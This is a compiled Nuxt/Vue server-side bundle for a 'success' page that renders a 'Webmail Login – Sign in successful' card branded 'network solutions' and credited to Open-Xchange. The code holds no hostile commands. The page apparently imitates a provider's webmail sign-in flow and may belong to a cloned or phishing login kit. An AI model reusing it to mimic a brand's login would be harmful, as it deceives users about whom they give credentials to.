exports.ids = [3];
exports.modules = {

/***/ 23:
/***/ (function(module, exports, __webpack_require__) {

// style-loader: Adds some css to the DOM by adding a <style> tag

// load the styles
var content = __webpack_require__(26);
if(content.__esModule) content = content.default;
if(typeof content === 'string') content = [[module.i, content, '']];
if(content.locals) module.exports = content.locals;
// add CSS to SSR context
var add = __webpack_require__(6).default
module.exports.__inject__ = function (context) {
  add("365ec806", content, true, context)
};

/***/ }),

/***/ 25:
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
__webpack_require__.r(__webpack_exports__);
/* harmony import */ var _node_modules_vue_style_loader_index_js_ref_3_oneOf_1_0_node_modules_css_loader_dist_cjs_js_ref_3_oneOf_1_1_node_modules_vue_loader_lib_loaders_stylePostLoader_js_node_modules_postcss_loader_dist_cjs_js_ref_3_oneOf_1_2_node_modules_nuxt_components_dist_loader_js_ref_0_0_node_modules_vue_loader_lib_index_js_vue_loader_options_success_vue_vue_type_style_index_0_id_33183427_prod_scoped_true_lang_css__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(23);
/* harmony import */ var _node_modules_vue_style_loader_index_js_ref_3_oneOf_1_0_node_modules_css_loader_dist_cjs_js_ref_3_oneOf_1_1_node_modules_vue_loader_lib_loaders_stylePostLoader_js_node_modules_postcss_loader_dist_cjs_js_ref_3_oneOf_1_2_node_modules_nuxt_components_dist_loader_js_ref_0_0_node_modules_vue_loader_lib_index_js_vue_loader_options_success_vue_vue_type_style_index_0_id_33183427_prod_scoped_true_lang_css__WEBPACK_IMPORTED_MODULE_0___default = /*#__PURE__*/__webpack_require__.n(_node_modules_vue_style_loader_index_js_ref_3_oneOf_1_0_node_modules_css_loader_dist_cjs_js_ref_3_oneOf_1_1_node_modules_vue_loader_lib_loaders_stylePostLoader_js_node_modules_postcss_loader_dist_cjs_js_ref_3_oneOf_1_2_node_modules_nuxt_components_dist_loader_js_ref_0_0_node_modules_vue_loader_lib_index_js_vue_loader_options_success_vue_vue_type_style_index_0_id_33183427_prod_scoped_true_lang_css__WEBPACK_IMPORTED_MODULE_0__);
/* harmony reexport (unknown) */ for(var __WEBPACK_IMPORT_KEY__ in _node_modules_vue_style_loader_index_js_ref_3_oneOf_1_0_node_modules_css_loader_dist_cjs_js_ref_3_oneOf_1_1_node_modules_vue_loader_lib_loaders_stylePostLoader_js_node_modules_postcss_loader_dist_cjs_js_ref_3_oneOf_1_2_node_modules_nuxt_components_dist_loader_js_ref_0_0_node_modules_vue_loader_lib_index_js_vue_loader_options_success_vue_vue_type_style_index_0_id_33183427_prod_scoped_true_lang_css__WEBPACK_IMPORTED_MODULE_0__) if(["default"].indexOf(__WEBPACK_IMPORT_KEY__) < 0) (function(key) { __webpack_require__.d(__webpack_exports__, key, function() { return _node_modules_vue_style_loader_index_js_ref_3_oneOf_1_0_node_modules_css_loader_dist_cjs_js_ref_3_oneOf_1_1_node_modules_vue_loader_lib_loaders_stylePostLoader_js_node_modules_postcss_loader_dist_cjs_js_ref_3_oneOf_1_2_node_modules_nuxt_components_dist_loader_js_ref_0_0_node_modules_vue_loader_lib_index_js_vue_loader_options_success_vue_vue_type_style_index_0_id_33183427_prod_scoped_true_lang_css__WEBPACK_IMPORTED_MODULE_0__[key]; }) }(__WEBPACK_IMPORT_KEY__));


/***/ }),

/***/ 26:
/***/ (function(module, exports, __webpack_require__) {

// Imports
var ___CSS_LOADER_API_IMPORT___ = __webpack_require__(5);
var ___CSS_LOADER_EXPORT___ = ___CSS_LOADER_API_IMPORT___(function(i){return i[1]});
// Module
___CSS_LOADER_EXPORT___.push([module.i, ".success-content[data-v-33183427]{align-items:center;display:flex;justify-content:center;min-height:calc(100vh - 134px)}.success-card[data-v-33183427]{background:#fff;border-radius:5px;box-shadow:0 18px 38px rgba(0,0,0,.25);box-sizing:border-box;padding:30px 26px;text-align:center;width:375px}.success-card h1[data-v-33183427]{font-size:21px;font-weight:700;margin:0 0 28px}.success-icon[data-v-33183427]{align-items:center;background:#287483;border-radius:50%;color:#fff;display:flex;font-size:30px;height:54px;justify-content:center;margin:0 auto 18px;width:54px}.success-card h2[data-v-33183427]{font-size:19px;margin:0 0 8px}.success-card p[data-v-33183427]{font-size:14px;margin:0 0 24px}", ""]);
// Exports
___CSS_LOADER_EXPORT___.locals = {};
module.exports = ___CSS_LOADER_EXPORT___;


/***/ }),

/***/ 31:
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
// ESM COMPAT FLAG
__webpack_require__.r(__webpack_exports__);

// CONCATENATED MODULE: ./node_modules/babel-loader/lib??ref--2-0!./node_modules/vue-loader/lib/loaders/templateLoader.js??ref--6!./node_modules/@nuxt/components/dist/loader.js??ref--0-0!./node_modules/vue-loader/lib??vue-loader-options!./pages/success.vue?vue&type=template&id=33183427&scoped=true
var render = function render() {
  var _vm = this,
    _c = _vm._self._c;
  return _c('div', {
    staticClass: "page"
  }, [_vm._ssrNode("<header class=\"topbar\" data-v-33183427><div class=\"brand\" data-v-33183427><div class=\"brand-network\" data-v-33183427>network</div> <div class=\"brand-solutions\" data-v-33183427>solutions</div></div> <div class=\"language\" data-v-33183427><span data-v-33183427>Language:</span> <span class=\"language-link\" data-v-33183427>English (United Kingdom)</span> <span class=\"chevron\" data-v-33183427>⌄</span></div></header> <main class=\"success-content\" data-v-33183427><section class=\"success-card\" data-v-33183427><h1 data-v-33183427>Webmail Login</h1> <div class=\"success-icon\" data-v-33183427>✓</div> <h2 data-v-33183427>Sign in successful</h2> <p data-v-33183427>You have successfully signed in.</p> <button type=\"button\" class=\"signin-button\" data-v-33183427>\n        Back to sign in\n      </button></section></main> <footer class=\"footer\" data-v-33183427><span data-v-33183427>© 2026 Open-Xchange GmbH</span> <span data-v-33183427>Version: 8.53.2</span> <span data-v-33183427>Privacy policy</span> <span data-v-33183427>Legal notes</span></footer>")]);
};
var staticRenderFns = [];

// CONCATENATED MODULE: ./pages/success.vue?vue&type=template&id=33183427&scoped=true

// EXTERNAL MODULE: ./node_modules/vue-loader/lib/runtime/componentNormalizer.js
var componentNormalizer = __webpack_require__(2);

// CONCATENATED MODULE: ./pages/success.vue

var script = {}
function injectStyles (context) {
  
  var style0 = __webpack_require__(25)
if (style0.__inject__) style0.__inject__(context)

}

/* normalize component */

var component = Object(componentNormalizer["a" /* default */])(
  script,
  render,
  staticRenderFns,
  false,
  injectStyles,
  "33183427",
  "a94c9d00"
  
)

/* harmony default export */ var success = __webpack_exports__["default"] = (component.exports);

/***/ })

};;
//# sourceMappingURL=success.js.map